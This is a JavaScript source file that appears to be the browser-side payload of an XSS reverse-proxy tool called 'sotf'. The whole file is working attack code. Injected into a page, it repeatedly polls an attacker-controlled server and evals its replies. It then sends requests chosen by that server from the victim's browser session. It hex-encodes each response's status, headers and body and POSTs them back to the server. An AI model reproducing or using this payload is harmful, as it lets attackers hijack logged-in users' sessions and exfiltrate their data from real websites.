//v1.0.0.0
var pending_requests=0;
var comm;
var vid=0;
var rid=0;
var ie=0;
var poll_sotf;

if(window.XDomainRequest)
{
   ie=1; 
}

poll();

function poll()
{
    if(ie)
    {
       poll_sotf = new XDomainRequest();
       poll_sotf.onload = process_poll_res;
    }
    else
    {
        poll_sotf = new XMLHttpRequest();
        poll_sotf.onreadystatechange = function()
        {
            if(poll_sotf.readyState == 4)
            {
                process_poll_res();
            }   
        }
    }
    if(vid > 0)
    {
        poll_sotf.open("GET", "http://" + sotf_server_url + "/poll/" + vid);
    }
    else
    {
        poll_sotf.open("GET", "http://" + sotf_server_url + "/poll/");
    }
    poll_sotf.send();
}
function process_poll_res()
{
    if(poll_sotf.responseText.length > 0)
    {
        if(poll_sotf.responseText.length > 13)
        {
            comm = eval('('+poll_sotf.responseText+')');//JSON.parse didn't go down well with IE(security_creds--)
            pending_requests = comm.req.length;
            setTimeout("exec_sotf_commands()",1);
        }
        else
        {
            vid = poll_sotf.responseText;
            setTimeout("poll()",1);
        }
    }
    else
    {
        setTimeout("poll()",1000);
    }
}
function exec_sotf_commands()
{
    if(pending_requests > 0)
    {
	var request_no = comm.req.length - pending_requests;
        var to_website = new XMLHttpRequest();
	var _req = comm.req[request_no];
	pending_requests--;
        if(_req.rid > rid)
        {           
            rid = _req.rid;
            to_website.open(comm.req[request_no].m, decodeFromHex(comm.req[request_no].u));
            to_website.open(_req.m, decodeFromHex(_req.u));
            to_website.onreadystatechange = function()
            {
                if(to_website.readyState == 4)
                {
                    var post_sotf;
                    if(ie)
                    {
                        post_sotf = new XDomainRequest();
                        post_sotf.open("POST", "http://" + sotf_server_url + "/push/" + vid + "_" + _req.rid);
                    }
                    else
                    {
                        post_sotf = new XMLHttpRequest();
                        post_sotf.open("POST", "http://" + sotf_server_url + "/push/" + vid + "_" + _req.rid);
                        post_sotf.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
                    }
                    var body = vid + "&" + _req.rid + "&" + to_website.status + "&" + encodeToHex(to_website.getAllResponseHeaders()) + "&" + encodeToHex(to_website.responseText);
                    post_sotf.send(body);
                }
            }
            if(_req.ct)
            {
                to_website.setRequestHeader("Content-Type", _req.ct);
            }
            if(_req.b.length > 0)
            {
                to_website.send(decodeFromHex(_req.b));
            }
            else
            {
                to_website.send();
            }
        }
        setTimeout("exec_sotf_commands()",1);
    }
    else
    {
        setTimeout("poll()",1);
    }
}

function encodeToHex(input){
    var output="x";
    var length = input.length;
    var count=0;
    var hex;
    while(count < length){
        hex = input.charCodeAt(count).toString(16);
        if(count == (length-1))
        {
            output = output + hex;
        }
        else
        {
            output = output + hex + "x";
        }
        count++;
    }
    return output;
}

function decodeFromHex(input){
    var output="";
    var count = input.length;
    var array = input.split('x');
    for(var ele in array)
    {
        if(array[ele].length > 0)
        {
            output += String.fromCharCode("0x"+ array[ele]);
        }
    }
    return output;
}